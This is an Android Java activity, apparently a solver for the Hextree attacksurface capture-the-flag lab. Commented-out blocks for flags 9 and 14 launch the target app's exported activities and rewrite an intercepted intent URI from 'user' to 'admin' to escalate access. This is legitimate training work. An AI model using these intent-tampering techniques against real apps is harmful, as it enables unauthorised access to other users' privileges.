package io.hextree.androidtest;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class HextreeActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_hextree);




//////////////////////////////////////flag 9 ////////////////////////////////////////////////
//        Intent intent = new Intent();
//        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity");
//        startActivityForResult(intent, 1);
//        Intent intent = new Intent();
//        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag9Activity");
//        startActivityForResult(intent, 1);
/////////////////////////////////////////////////////////////////////////////////////////////





//////////////////////////////////////flag 14 ////////////////////////////////////////////////
//        Intent intent = getIntent();
//        Uri data = intent.getData();
//        Log.d("Intent Data : ",(data).toString());
//        Uri new_data = Uri.parse((data).toString().replace("user","admin"));
//        Log.d("Modified Data : ",(new_data).toString());//change user to admin
//        Intent sendIntent = new Intent();
//        sendIntent.setAction("android.intent.action.VIEW");
//        sendIntent.setData(new_data);
//        sendIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity");
//        startActivity(sendIntent);
/////////////////////////////////////////////////////////////////////////////////////////////



        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }
}